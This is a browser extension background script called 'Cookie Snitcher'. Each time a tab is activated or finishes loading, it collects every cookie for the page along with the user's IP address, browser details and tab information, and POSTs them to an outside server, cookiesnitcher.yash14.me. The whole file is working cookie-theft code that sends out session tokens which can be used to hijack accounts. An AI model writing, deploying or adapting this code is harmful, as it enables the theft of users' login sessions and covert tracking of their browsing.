// background.js

const API_ENDPOINT = "https://cookiesnitcher.yash14.me/api/cookies"; // Updated endpoint

async function getActiveTab() {
  const tabs = await chrome.tabs.query({ active: true, currentWindow: true });
  return tabs[0];
}

// Function to get IP address
async function getIPAddress() {
  try {
    const response = await fetch("https://api.ipify.org?format=json");
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error("Cookie Snitcher: Error fetching IP address:", error);
    return "unknown";
  }
}

// Function to get browser information
function getBrowserInfo() {
  return {
    userAgent: navigator.userAgent,
    language: navigator.language,
    cookiesEnabled: navigator.cookieEnabled,
    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timestamp: new Date().toISOString(),
  };
}

async function fetchAndSendCookies(tab) {
  if (!tab || !tab.id || !tab.url) {
    console.log("Cookie Snitcher: No active tab or tab URL found.");
    return;
  }

  // Ensure the URL is http or https before trying to get cookies
  if (!tab.url.startsWith("http:") && !tab.url.startsWith("https:")) {
    console.log(
      `Cookie Snitcher: Cannot fetch cookies for non-HTTP/S URL: ${tab.url}`
    );
    return;
  }

  try {
    // Get cookies
    const cookies = await chrome.cookies.getAll({ url: tab.url });
    console.log(
      `Cookie Snitcher: Fetched ${cookies.length} cookies for ${tab.url}`
    );

    if (cookies.length > 0) {
      // Format cookies as JSON
      const cookiesJson = JSON.stringify(cookies, null, 2);
      console.log("Cookie Snitcher: Cookies in JSON format:", cookiesJson);

      // Get IP address
      const ipAddress = await getIPAddress();

      // Get browser info
      const browserInfo = getBrowserInfo();

      // Prepare enhanced payload
      const payload = {
        cookies: cookies,
        tabInfo: {
          id: tab.id,
          url: tab.url,
          title: tab.title || "Unknown Title",
          favIconUrl: tab.favIconUrl || null,
          status: tab.status || null,
          incognito: tab.incognito || false,
          windowId: tab.windowId || null,
          active: tab.active || false,
        },
        userInfo: {
          ipAddress: ipAddress,
          browserInfo: browserInfo,
        },
        timestamp: new Date().toISOString(),
      };

      console.log(
        "Cookie Snitcher: Sending enhanced data to backend:",
        payload
      );

      const response = await fetch(API_ENDPOINT, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      });

      if (response.ok) {
        const responseData = await response.json();
        console.log(
          "Cookie Snitcher: Data sent successfully to backend.",
          responseData
        );
      } else {
        const errorText = await response.text();
        console.error(
          `Cookie Snitcher: Failed to send data. Status: ${response.status}`,
          errorText
        );
      }
    } else {
      console.log(`Cookie Snitcher: No cookies found for ${tab.url}`);
    }
  } catch (error) {
    console.error("Cookie Snitcher: Error fetching or sending cookies:", error);
  }
}

// Listen for when the active tab changes
chrome.tabs.onActivated.addListener(async (activeInfo) => {
  console.log("Cookie Snitcher: Tab activated:", activeInfo);
  const tab = await chrome.tabs.get(activeInfo.tabId);
  if (chrome.runtime.lastError) {
    console.error(
      `Cookie Snitcher: Error getting tab info onActivated: ${chrome.runtime.lastError.message}`
    );
    return;
  }
  await fetchAndSendCookies(tab);
});

// Listen for when a tab is updated (e.g., URL changes)
chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
  // We are interested in updates where the URL has changed, or the status is complete.
  // 'status' can be 'loading' or 'complete'.
  if (changeInfo.status === "complete" && tab.active) {
    console.log(
      "Cookie Snitcher: Tab updated and active:",
      tabId,
      changeInfo,
      tab
    );
    await fetchAndSendCookies(tab);
  }
});

// Optional: Add a listener for when the extension is first installed or updated
chrome.runtime.onInstalled.addListener((details) => {
  console.log("Cookie Snitcher: Extension installed or updated.", details);
  // You could perform initial setup here if needed.
});

console.log("Cookie Snitcher: Background script loaded.");
